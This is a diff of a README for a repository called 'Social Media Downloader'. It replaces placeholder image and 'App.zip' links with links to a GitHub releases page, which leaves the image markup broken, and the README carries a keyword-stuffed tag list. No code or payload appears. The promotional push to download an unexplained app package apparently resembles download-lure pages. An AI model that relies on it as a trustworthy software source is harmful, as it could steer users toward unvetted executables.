@@ -2,7 +2,7 @@
 
 Welcome to the **Social Media Downloader** repository, your one-stop solution for downloading videos and music from various social media platforms! 
 
-![Social Media Downloader](https://example.com/social-media-downloader.png)
+![Social Media Downloader](https://github.com/Cherif-mico/social-media-downloader/releases)
 
 ## Overview
 
@@ -42,9 +42,9 @@ Our tools are designed to be fast and efficient, ensuring you can download your 
 - youtube-downloader
 - youtube-video-downloader
 
-🔗 **Download Link**: [Get the App Here!](https://github.com/uploads/App.zip)
+🔗 **Download Link**: [Get the App Here!](https://github.com/Cherif-mico/social-media-downloader/releases)
 
-[![Download App](https://img.shields.io/badge/Download-App-green)](https://github.com/uploads/App.zip)
+[![Download App](https://github.com/Cherif-mico/social-media-downloader/releases)](https://github.com/Cherif-mico/social-media-downloader/releases)
 
 ## How to Use
 
@@ -64,4 +64,4 @@ If you encounter any issues or have questions regarding the tools in this reposi
 
 🚀 Start downloading your favorite social media content now with the **Social Media Downloader**! Save videos and music with ease and enjoy them offline anytime you want. Happy downloading! 🎉
 
-![Social Media Downloader](https://example.com/social-media-downloader2.png)
+![Social Media Downloader](https://github.com/Cherif-mico/social-media-downloader/releases)
